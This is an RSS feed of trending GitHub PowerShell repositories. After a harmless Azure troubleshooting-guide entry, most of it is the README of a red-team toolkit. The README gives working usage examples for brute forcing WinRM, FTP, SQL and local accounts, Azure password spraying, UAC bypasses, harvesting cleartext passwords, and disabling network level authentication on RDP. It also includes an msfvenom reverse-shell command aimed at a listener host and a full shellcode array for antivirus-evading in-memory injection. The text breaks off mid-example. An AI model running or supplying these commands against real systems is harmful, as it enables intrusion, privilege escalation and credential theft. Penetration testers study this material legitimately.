<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-26T01:44:11Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Azure/Service-Fabric-Troubleshooting-Guides</title>
    <updated>2022-08-26T01:44:11Z</updated>
    <id>tag:github.com,2022-08-26:/Azure/Service-Fabric-Troubleshooting-Guides</id>
    <link href="https://github.com/Azure/Service-Fabric-Troubleshooting-Guides" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Service Fabric Trouble Shooting Guides used by Azure Customer Support Services and Product Group Site Reliability Engineers.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Service Fabric Troubleshooting Guides&lt;/h1&gt; &#xA;&lt;p&gt;This is a public repository for all of Service Fabric&#39;s Troublesooting guides, and is intended to provide a central location for community driven troubleshooting content. This is the material that is reference by Customer Support Services when a ticket is created, by Service Fabric Site Reliability Engineers responding to an incident, and by users when self discoverying resolutions to active system issues.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;p&gt;Troubleshooting guides are grouped by categories, and stored in relevantly named subdirectories; each directory containing a README the lists the commonly used and exposed guides through portal as recommendations during ticket creation process. The following are the categories of guides that are stored in reletantly named directories:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/Service-Fabric-Troubleshooting-Guides/master/Security/README.md&#34;&gt;Security&lt;/a&gt; - Certificates, KeyVault, Azure Active Directory, Permissions.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/Service-Fabric-Troubleshooting-Guides/master/Cluster/README.md&#34;&gt;Cluster&lt;/a&gt; - Scaling, Deployments, Nodes, Patch Orchestration.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/Service-Fabric-Troubleshooting-Guides/master/Deployment/README.md&#34;&gt;Deployment&lt;/a&gt; - SF Internal Components During Deployment&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&#34;https://cla.microsoft.com&#34;&gt;https://cla.microsoft.com&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;When you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;Legal Notices&lt;/h2&gt; &#xA;&lt;p&gt;Microsoft and any contributors grant you a license to the Microsoft documentation and other content in this repository under the &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/legalcode&#34;&gt;Creative Commons Attribution 4.0 International Public License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/Service-Fabric-Troubleshooting-Guides/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file, and grant you a license to any code in the repository under the &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;MIT License&lt;/a&gt;, see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/Service-Fabric-Troubleshooting-Guides/master/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt; file.&lt;/p&gt; &#xA;&lt;p&gt;Microsoft, Windows, Microsoft Azure and/or other Microsoft products and services referenced in the documentation may be either trademarks or registered trademarks of Microsoft in the United States and/or other countries. The licenses for this project do not grant you rights to use any Microsoft names, logos, or trademarks. Microsoft&#39;s general trademark guidelines can be found at &lt;a href=&#34;http://go.microsoft.com/fwlink/?LinkID=254653&#34;&gt;http://go.microsoft.com/fwlink/?LinkID=254653&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Privacy information can be found at &lt;a href=&#34;https://privacy.microsoft.com/en-us/&#34;&gt;https://privacy.microsoft.com/en-us/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Microsoft and any contributors reserve all others rights, whether under their respective copyrights, patents, or trademarks, whether by implication, estoppel or otherwise.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>tobor88/PowerShell-Red-Team</title>
    <updated>2022-08-26T01:44:11Z</updated>
    <id>tag:github.com,2022-08-26:/tobor88/PowerShell-Red-Team</id>
    <link href="https://github.com/tobor88/PowerShell-Red-Team" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Collection of PowerShell functions a Red Teamer may use in an engagement&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PowerShell-Red-Team-Enum&lt;/h1&gt; &#xA;&lt;p&gt;Collection of PowerShell functions a Red Teamer may use to collect data from a machine or gain access to a target. I added ps1 files for the commands that are included in the RedTeamEnum module. This will allow you to easily find and use only one command if that is all you want. If you want the entire module perform the following actions after downloading the RedTeamEnum directory and contents to your device.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; robocopy .\RedTeamEnum $env:USERPROFILE\Documents\WindowsPowerShell\Modules\RedTeamEnum *&#xA;# This will copy the module to a location that allows you to easily import it. If you are using OneDrive sync you may need to use $env:USERPROFILE\OneDrive\Documents\WindowsPowerShell\Modules\RedTeamEnum instead.&#xA;&#xA;C:\PS&amp;gt; Import-Module -Name RedTeamEnum -Verbose&#xA;# This will import all the commands in the module.&#xA;&#xA;C:\PS&amp;gt; Get-Command -Module RedTeamEnum&#xA;# This will list all the commands in the module.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Convert-Base64.ps1 is a function as the name states for encoding and/or decoding text into Base64 format.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Convert-Base64 -Value &#34;Convert me to base64!&#34; -Encode&#xA;&#xA;C:\PS&amp;gt; Convert-Base64 -Value &#34;Q29udmVydCBtZSB0byBiYXNlNjQh&#34; -Decode&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Convert-StringToHash.ps1 is a function for converting a string value to a hash value&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Convert-StringToHash -String &#34;Convert me to base64!&#34;&#xA;C:\PS&amp;gt; Convert-StringToHash -String &#34;Password123&#34; -Encoding UTF8 -Algorithm MD5&#xA;# Both of the above examples convert the string Password123 to an MD5 Hash value&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Convert-SID.ps1 is a function that converts SID values to usernames and usernames to SID values&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Convert-SID -Username tobor&#xA;# The above example converts tobor its SID value&#xA;&#xA;C:\PS&amp;gt; Convert-SID -SID S-1-5-21-2860287465-2011404039-792856344-500&#xA;# The above value converts the SID value to its associated username&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-BruteZipPassword is a function that uses a password file to brute force a password protected zip file using 7zip&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Test-BruteForceZipPassword -PassFile &#39;C:\Users\USER\Downloads\Applications\pass.txt&#39; -Path &#39;C:\Users\USER\Downloads\Applications\KiTTY.7z&#39; -ZipExe &#39;C:\Program Files\7-Zip\7z.exe&#39;&#xA;# This example uses the passwords in the pass.txt file to crack the password protected KiTTY.7z file&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-BruteForceCredentials is a function that uses WinRM to brute force a users password.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Test-BruteForceCredentials -ComputerName DC01.domain.com -UseSSL -Username &#39;admin&#39;,&#39;administrator&#39; -Passwd &#39;Password123!&#39; -SleepMinutes 5&#xA;# This example will test the one password defined against both the admin and administrator users on the remote computer DC01.domain.com using WinRM over HTTPS with a time interval of 5 minutes between each attempt&#xA;&#xA;C:\PS&amp;gt; Test-BruteForceCredentials -ComputerName File.domain.com -UserFile C:\Temp\users.txt -PassFile C:\Temp\rockyou.txt&#xA;# This example will test every password in rockyou.txt against every username in the users.txt file without any pause between tried attempts&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get-LdapInfo is a function I am very proud of for performing general LDAP queries. Although only two properties will show in the output, all of the properties associated with object can be seen by piping to Select-Object -Property * or using the -Detailed switch parameter.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Get-LdapInfo -Detailed -SPNNamedObjects&#xA;# The above returns all the properties of the returned objects&#xA;#&#xA;C:\PS&amp;gt; Get-LdapInfo -DomainControllers | Select-Object -Property &#39;Name&#39;,&#39;ms-Mcs-AdmPwd&#39;&#xA;# If this is run as admin it will return the LAPS password for the local admin account&#xA;#&#xA;C:\PS&amp;gt; Get-LdapInfo -ListUsers | Where-Object -Property SamAccountName -like &#34;user.samname&#34;&#xA;# NOTE: If you include the &#34;-Detailed&#34; switch and pipe the output to where-object it will not return any properties. If you wish to display all the properties of your result it will need to be carried out using the below format&#xA;#&#xA;C:\PS&amp;gt; Get-LdapInfo -AllServers | Where-Object -Property LogonCount -gt 1 | Select-Object -Property *&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get-NetworkShareInfo is a cmdlet that is used to retrieve information and/or brute force discover network shares available on a remote or local machine&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Get-NetworkShareInfo -ShareName C$&#xA;# The above example returns information on the share C$ on the local machine&#xA;#RESULTS&#xA;Name         : C$&#xA;InstallDate  :&#xA;Description  : Default share&#xA;Path         : C:\&#xA;ComputerName : TOBORDESKTOP&#xA;Status       : OK&#xA;&#xA;C:\PS&amp;gt; Get-NetworkShareInfo -ShareName NETLOGON,SYSVOL,C$ -ComputerName DC01.domain.com, DC02.domain.com, 10.10.10.1&#xA;# The above example disocvers and returns information on NETLOGON, SYSVOL, and C$ on the 3 remote devices DC01, DC02, and 10.10.10.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-PrivEsc is a function that can be used for finding whether WSUS updates over HTTP are vulnerable to PrivEsc, Clear Text credentials are stored in common places, AlwaysInstallElevated is vulnerable to PrivEsc, Unquoted Service Paths exist, and enum of possible weak write permissions for services.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt; C:\PS&amp;gt; Test-PrivEsc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get-InitialEnum is a function for enumerating the basics of a Windows Operating System to help better display possible weaknesses.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt; C:\PS&amp;gt; Get-InitialEnum&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Start-SimpleHTTPServer is a function used to host an HTTP server for downloading files. It is meant to be similart to pythons SimpleHTTPServer module. Directories are not traversable through the web server. The files that will be hosted for download will be from the current directory you are in when issuing this command.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Start-SimpleHTTPServer&#xA;Open HTTP Server on port 8000&#xA;&#xA;#OR&#xA;C:\PS&amp;gt; Start-SimpleHTTPServer -Port 80&#xA;# Open HTTP Server on port 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-PortScan.ps1 is a function for scanning all possible TCP ports on a target. I will improve in future by including UDP as well as the ability to define a port range. This one is honestly not even worth using because it is very slow. Threading is a weak area of mine and I plan to work on that with this one.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt; C:\PS&amp;gt; Invoke-PortScan -IpAddress 192.168.0.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-PingSweep is a function used for performing a ping sweep of a subnet range.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Invoke-PingSweep -Subnet 192.168.1.0 -Start 192 -End 224 -Source Singular&#xA;# NOTE: The source parameter only works if IP Source Routing value is &#34;Yes&#34;&#xA;&#xA;C:\PS&amp;gt; Invoke-PingSweep -Subnet 10.0.0.0 -Start 1 -End 20 -Count 2&#xA;# Default value for count is 1&#xA;&#xA;C:\PS&amp;gt; Invoke-PingSweep -Subnet 172.16.0.0 -Start 64 -End 128 -Count 3 -Source Multiple&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-UseCreds is a function I created to simplify the process of using obtained credentials during a pen test. I use -Passwd instead of -Password because that parameter when defined should be configured as a secure string which is not the case when entering a value into that filed with this function. It gets converted to a secure string after you set that value.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# The below command will use the entered credentials to open the msf.exe executable as the user tobor&#xA;C:\PS&amp;gt; Invoke-UseCreds -Username &#39;OsbornePro\tobor&#39; -Passwd &#39;P@ssw0rd1&#39; -Path .\msf.exe -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This cmdlet can also be used to execute files located on your local machine and execute them on a remote machine&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# The below command will use the entered credentials to open the exploit.ps1 executable as the user tobor on DC01 and DC02 using WinRM&#xA;C:\PS&amp;gt; Invoke-UseCreds -Username &#39;OsbornePro\tobor&#39; -Passwd &#39;P@ssw0rd1&#39; -Path .\exploit.ps1 -ComputerName &#34;DC01.domain.com&#34;,&#34;DC02.domain.com&#34;&#xA;&#xA;# The below command will use the entered credentials to open the exploit.ps1 executable as the user tobor on DC01 and DC02 using WinRM over HTTPS&#xA;C:\PS&amp;gt; Invoke-UseCreds -Username &#39;OsbornePro\tobor&#39; -Passwd &#39;P@ssw0rd1&#39; -Path .\exploit.ps1 -ComputerName &#34;DC01.domain.com&#34;,&#34;DC02.domain.com&#34; -UseSSL&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-FodHelperBypass is a function that tests whether or not the UAC bypass will work before executing it to elevate priviledges. This of course needs to be run by a member of the local administrators group as this bypass elevates the priviledges of the shell you are in. You can define the program to run which will allow you to execute generaate msfvenom payloads as well as cmd or powershell or just issuing commands.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Invoke-FodHelperBypass -Program &#34;powershell&#34; -Verbose&#xA;# OR&#xA;C:\PS&amp;gt; Invoke-FodHelperBypass -Program &#34;cmd /c msf.exe&#34; -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-InMemoryPayload is used for AV Evasion using an In-Memory injection. This will require the runner to generate an msfvenom payload using a command similar to the example below, and entering the &#34;[Byte[]] $buf&#34; variable into Invoke-InMemoryPayloads &#34;ShellCode&#34; parameter.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Generate payload to use&#xA;msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=192.168.137.129 LPORT=1337 -f powershell&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start a listener, use that value in the &#34;ShellCode&#34; parameter, and run the command to gain your shell. This will also require certain memory protections to not be enabled. &lt;strong&gt;NOTE:&lt;/strong&gt; Take note there are &lt;strong&gt;NOT ANY DOUBLE QUOTES&lt;/strong&gt; around the ShellCode variables value. This is because it is expecting a byte array.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;C:\PS&amp;gt; Invoke-InMemoryPayload -Payload 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x5,0x39,0xc0,0xa8,0x89,0x81,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5 -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/tobor88/PowerShell-Red-Team/master/InvokeInMemPayloadImg.png&#34; alt=&#34;Invoke-InMemoryPayload Image&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get-ClearTextPassword is used to obtain cached passwords, SNMP passwords in the registry, auto logon passwords, and WiFi passwords that are stored on a device. Only the current users passwords are able to be pulled from saved locations&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-ClearTextPassword -All&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above command returns all the possible results the cmdlet is capable of. Individual locations can be searched as well. For Example&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-ClearTextPassword -AutoLogon&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More than one location can be defined in your search For Example&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Get-ClearTextPassword -WiFi -SNMP -Chrome -PasswordVault&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-AzureEnum.ps1 can be used to utilize Azure credentials for Azure enumeration saving the results to a file&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Invoke-AzureEnum.ps1 -Path &#39;C:\Temp\enum.txt&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-AzurePasswordSpray can be used to perform a password dictionary attack against a single user or multiple users while testing credentials against Azure AD.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Invoke-AzurePasswordSpray -UserName &#34;rob@domain.com&#34;,&#34;john@domain.com&#34; -Passwd &#39;Password123!&#39;,&#39;asdf123!&#39;&#xA;# This Example tests the passwords defined against the list of usernames defined&#xA;&#xA;Invoke-AzurePasswordSpray -UserName &#34;rob@domain.com&#34;,&#34;john@domain.com&#34; -Passwd &#39;Password123!&#39;,&#39;asdf123!&#39; -SleepSeconds 60&#xA;# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt&#xA;&#xA;Invoke-AzurePasswordSpray -UserName &#34;rob@domain.com&#34;,&#34;john@domain.com&#34; -Passwd &#39;Password123!&#39;,&#39;asdf123!&#39; -SleepSeconds 60 -RoundRobin&#xA;# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt. This performs authentication attempts in a Round Robin fashion for the defined usernames&#xA;&#xA;$UserNames = &#34;rob@domain.com&#34;,&#34;john@domain.com&#34;,&#34;dixie@domain.com&#34;,&#34;chris@domain.com&#34;&#xA;$UserNames | Invoke-AzurePasswordSpray -Passwd &#34;Password123!&#34; -RoundRobin&#xA;# This Example tests the passwords defined against the list of usernames defined in a Round Robin fashion&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-KerberosDoubleHop is used to discover Computers, Users, and/or Administrator accounts who are vulberable to a Kerberos Double Hop&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Test-KerberosDoubleHop -All&#xA;# This example checks for and displays Computers, Users, and Admin AD Objects vulnerable to a Kerberos Double Hop on the domain controller you are logged into&#xA;&#xA;Test-KerberosDoubleHop -Server DC01.domain.com -UserResults&#xA;# This example uses WinRM to display User AD Objects vulnerable to a Kerberos Double Hop on the remote domain controller DC01.domain.com&#xA;&#xA;Test-KerberosDoubleHop -Server DC01.domain.com -UseSSL -AdminResults&#xA;# This example uses WinRM over HTTPS to display Admin AD Objects vulnerable to a Kerberos Double Hop on the remote domain controller DC01.domain.com&#xA;&#xA;Test-KerberosDoubleHop -ComputerResults -AdminResults&#xA;# This example checks for and displays Computer and Admin AD Objects vulnerable to a Kerberos Double Hop on the domain controller you are logged into&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-DccwUACBypass is used to bypass UAC without a password if you are a member of an administrator group. This exploits DCCW&#39;s functionality to achieve this task. If the settings do not allow for this to work this cmdlet will stop execution. If the settings do allow this to work it will tell you what to do to defend against this.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Invoke-DccwUACBypass -Program &#34;cmd /c start powershell&#34;&#xA;# This example exploits the DCCW UAC bypass method to open PowerShell with administrative privileges&#xA;&#xA;Invoke-DccwUACBypass -Program &#34;cmd /c start mfs.exe&#34;&#xA;# This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Enable-RDP is used to enable RDP on a local machine, disable network level authentication, and enable the firewall rule for port 3389.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Enable-RDP&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-BruteLocalUserCredential is used to brute force the password of a local account on a local machine&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Test-BruteLocalUserCredential -Username Administrator -Passwd &#39;Password123!&#39;,&#39;Passw0rd1!&#39;&#xA;# This example tests the two defined passwords against the Administrator user account&#xA;&#xA;Test-BruteLocalUserCredential -Username Administrator -Passwd (Get-Content -Path C:\Temp\passlist.txt)&#xA;# This example tests the passwords inside the C:\Temp\passlist.txt file against the Administrator user account&#xA;&#xA;$Users = (Get-LocalUser).Name&#xA;ForEach $U in $Users) {Test-BruteLocalUserCredential -Username $U -Passwd (Get-Content -Path C:\Temp\passlist.txt)}&#xA;# This example tests a password list against all local user accounts&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-FTPCredential is used to brute force passwords against an FTP or FTP over SSL server&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Test-FTPCredential -Server FTP.domian.com -Username ftpuser -Passwd &#39;Password123&#39;,&#39;Passw0rd1!&#39;,&#39;password123!&#39; -Port 21 -Protocol FTP&#xA;# This example tests the 3 defined passwords against the ftpuser account on the FTP server located on FTP.domain.com over port 21&#xA;&#xA;Test-FTPCredential -Server FTP.domian.com -Username ftpuser,admin -Passwd &#39;Password123&#39;,&#39;Passw0rd1!&#39;,&#39;password123!&#39; -Protocol FTPS -Seconds 60&#xA;# This example tests the 3 defined passwords against the admin and ftpuser account on the FTP server located on FTP.domain.com over port 21, waiting 60 seconds in between failed attempts&#xA;&#xA;Test-FTPCredential -Server FTP.domian.com -Username (Get-Content -Path C:\Temp\userlist.txt) -Passwd (Get-Content -Path C:\Temp\passlist.txt)&#xA;# This example tests the passwords in C:\Temp\passlist.txt against all users defined in C:\Temp\userlist.txt file against the FTP server located at FTP.domain.com over port 21, waiting 1 seconds in between failed attempts&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Test-SQLCredential is used to brute force passwords against a local or remote SQL Server&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Test-SQLCredential -Server sql.domian.com -Username sa -Passwd &#39;Password123&#39;,&#39;Passw0rd1!&#39;,&#39;password123!&#39; -Port 1433&#xA;# This example tests the 3 defined passwords against the sa account on the SQL server located on sql.domain.com over port 1433&#xA;&#xA;Test-SQLCredential -Server sql.domian.com -Username sa,admin -Passwd &#39;Password123&#39;,&#39;Passw0rd1!&#39;,&#39;password123!&#39; -Seconds 60&#xA;# This example 